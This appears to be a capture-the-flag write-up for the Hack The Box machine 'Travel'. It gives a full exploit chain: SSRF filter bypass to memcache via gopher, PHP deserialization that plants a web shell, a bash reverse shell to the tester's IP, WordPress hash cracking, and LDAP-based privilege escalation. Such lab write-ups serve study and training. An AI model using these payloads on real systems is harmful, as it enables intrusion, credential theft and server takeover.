## Travel

https://app.hackthebox.com/machines/252

### www-data

NMAP Output reveal some subdomains:  
`Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb`

Directory enumeration founds `.git`.
```
gobuster dir -u http://blog-dev.travel.htb -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt

python3 ~/Tools/git-dumper/git_dumper.py http://blog-dev.travel.htb/ blog-dev
```

<br>

On `rss_template.php`, we find a debug file and a parameter check (custom_feed_url).

```php
# Debug File
<?php
if (isset($_GET['debug'])){
  include('debug.php');
}
?>

# 
$url = $_SERVER['QUERY_STRING'];
if(strpos($url, "custom_feed_url") !== false){
	$tmp = (explode("=", $url)); 	
	$url = end($tmp); 	
 } else {
	$url = "http://www.travel.htb/newsfeed/customfeed.xml";
 }
 $feed = get_feed($url);
```

"explode" split the string by another string, in this case is "=", so we can call this endpoint with something like `http://blog.travel.htb/awesome-rss/?custom_feed_url&url=http://10.10.14.5/feed`.  

This also works: `http://blog.travel.htb/awesome-rss/?custom_feed_url=http://10.10.14.5/feed`

If we access /newsfeed/customfeed.xml and debug.php, we get something that seems a php serialized object.

If we access our server and debug.php (wp-content/themes/twentytwenty/debug.php), we get nothing on the object.

If we can copy the content of customfeed.xml to a file we own, the object will reappear but with a different begin.

![Pasted image 20240529143213](https://github.com/b1d0ws/OSWE/assets/58514930/f5c7159e-6f24-4ac1-a30d-9b90a42299ed)

To discover the full name that memcache is generating, we can investigate the source code of [SamplePie](https://github.com/WordPress/WordPress/blob/master/wp-includes/class-simplepie.php).

```php
return new $class('memcache://127.0.0.1:11211/?timeout=60&prefix=xct_', md5($url), 'spc');
```

So the cached name is `md5(md5($url) . ":spc")`.

```
# Testing
echo -n "$(echo -n 'http://www.travel.htb/newsfeed/customfeed.xml' | md5sum | cut -d' ' -f1):spc" | md5sum
4e5612ba079c530a6b1f148c0b352241  -
```

<br>

#### Serialized Object
On template.php, we have object deserialization on class TemplateHelper:
```php
class TemplateHelper
{

    private $file;
    private $data;

    public function __construct(string $file, string $data)
    {
    	$this->init($file, $data);
    }

    public function __wakeup()
    {
    	$this->init($this->file, $this->data);
    }

    private function init(string $file, string $data)
    {    	
        $this->file = $file;
        $this->data = $data;
        file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);
    }
}
```

<br>

We can generate a payload copying part of this code. For some reason, we need to change the private variables to public.
```php
<?php

class TemplateHelper
{

    public $file;
    public $data;

    public function __construct()
    {
        $this->file = 'reverse.php';
        $this->data = '<?php system($_GET["cmd"]); ?>';
    }

}

$obj = new TemplateHelper();
echo serialize($obj);

?>

O:14:"TemplateHelper":2:{s:4:"file";s:11:"reverse.php";s:4:"data";s:30:"<?php system($_GET["cmd"]); ?>";}                   
```

<br>

#### Gopherus Exploit
We can use gopher protocol to get SSRF. Gopherus can be used to generate a memcache payload.
```
gopherus --exploit phpmemcache
```

There are some protections on template.php.
```php
function safe($url)
{
	// this should be secure
	$tmpUrl = urldecode($url);
	if(strpos($tmpUrl, "file://") !== false or strpos($tmpUrl, "@") !== false)
	{		
		die("<h2>Hacking attempt prevented (LFI). Event has been logged.</h2>");
	}
	if(strpos($tmpUrl, "-o") !== false or strpos($tmpUrl, "-F") !== false)
	{		
		die("<h2>Hacking attempt prevented (Command Injection). Event has been logged.</h2>");
	}
	$tmp = parse_url($url, PHP_URL_HOST);
	// preventing all localhost access
	if($tmp == "localhost" or $tmp == "127.0.0.1")
	{		
		die("<h2>Hacking attempt prevented (Internal SSRF). Event has been logged.</h2>");		
	}
	return $url;
}
```

<br>

To bypass the SSRF protection, we can replace `127.0.0.1` with decimal IP `2130706344`.

Using this address with gopherus:
```bash
curl -s 'http://blog.travel.htb/awesome-rss/?custom_feed_url&url=gopher://2130706433:11211/_%0d%0aset%20SpyD3r%204%200%2012%0d%0atest%20payload%0d%0a'

curl -s 'http://blog.travel.htb/awesome-rss/?debug' | grep '^| '
| SpyD3r | test payload |
```

We just need to update two things now. Change the gopherus to a valid memcache location and the seralized object payload.

```
http://blog.travel.htb/awesome-rss/?custom_feed_url&url=gopher://2130706433:11211/_
set xct_4e5612ba079c530a6b1f148c0b352241 4 0 101
O:14:"TemplateHelper":2:{s:4:"file";s:8:"bido.php";s:4:"data";s:30:"<?php system($_GET["cmd"]); ?>";}

# Attack
curl -s 'http://blog.travel.htb/awesome-rss/?custom_feed_url&url=gopher://2130706433:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20101%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:8:%22bido.php%22%3Bs:4:%22data%22%3Bs:30:%22%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a'
```

To trigger, we can just access the default feed location.
```
curl -s 'http://blog.travel.htb/awesome-rss/'
```

The PHP writes the file to `__DIR__.'/logs/'.$this->file`, so we can access `http://blog.travel.htb/wp-content/themes/twentytwenty/logs/reverse.php?cmd=id`.

To get a shell.
```
curl -G 'http://blog.travel.htb/wp-content/themes/twentytwenty/logs/bido.php' --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.2/1337 0>&1'"
```

<br>

### lynik-admin user
The shell we get is inside a container.

Enumerating, we found hashes inside /opt/wordpress/backup-13-04-2020.sql.
```
INSERT INTO `wp_users` VALUES (1,'admin','$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/','admin','admin@travel.htb','http://localhost','2020-04-13 13:19:01','',0,'admin'),(2,'lynik-admin','$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.','lynik-admin','lynik@travel.htb','','2020-04-13 13:36:18','',0,'Lynik Schmidt');
```

Cracking hashes, we found password `'stepcloser`.
```
hashcat -m 400 wp_hashes /usr/share/wordlists/rockyou.txt --force
```

Use this password to login in SSH as lynik-admin user.
```
sshpass -p 1stepcloser ssh lynik-admin@10.10.10.189
```

<br>

### Privilege Escalation
Privesc is simplified here, as it does not add to OSWE.

Inside user home, there is .ldaprc that can be interesting.
```
HOST ldap.travel.htb
BASE dc=travel,dc=htb
BINDDN cn=lynik-admin,dc=travel,dc=htb
```

Looking at .viminfo, we found ldap password `Theroadlesstraveled`.

With this, we can create a user, set a password and put it on sudo group (27 in this case, enumerated on machine on /etc/group).

Create the file above.
```
dn: uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
changeType: modify
replace: gidNumber
gidNumber: 27
-
replace: userPassword
userPassword: bido
-
add: objectClass
objectClass: ldapPublicKey
-
add: sshPublicKey
sshPublicKey: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKFgFW0D9WR7UAYOxLMrlEDeXfpuMUf/IDusWou4h4YDmoqQwKZ0htGXX5OjwHT3UGKNX15Dc+Y+LqDPOmwppoz5EgkpPCalEuonkkqXvZ413ReSxxaShBEg5fRuq/JfUYA/5SASeO1u/4TaSx88Va0ymCY87BYoQOe2mh0HDUyx3eQstIso9UipJr9OOP5a25RG/fBhIfpCN+OHLTQNVmtAeC8CQWUasn1Hn0kg+4SkZZBcSNR/RKoNJSXlTDYY4Gg2Ca3NOYgUvQcwRbVl9Ri4vhbh1wlzbvF8dqWK4S28wNX3zrZVWxqGZVLXdRLg3LlMn4uxcbYYEsxtGc4sI22mfHV5alrR+Q/bp8TAYm4FFuXvDoqSfnrtT2w9zAXk4BM+fGo1necfddrR2sTUN9jjJIGUXbFfX8jkWliPh9qbPAN3U6OWzuQeGursPxOGH+TFDbSR+/LNCgvLryjkvmcPieju1cjBViEV180VuWcTNIN7phf1Y2dumkhw7S+pM= kali@kali
```

And execute this:
```
ldapadd -D "cn=lynik-admin,dc=travel,dc=htb" -w Theroadlesstraveled -f gettingRoot.ldif

ssh -i johnny johnny@10.10.10.189
```
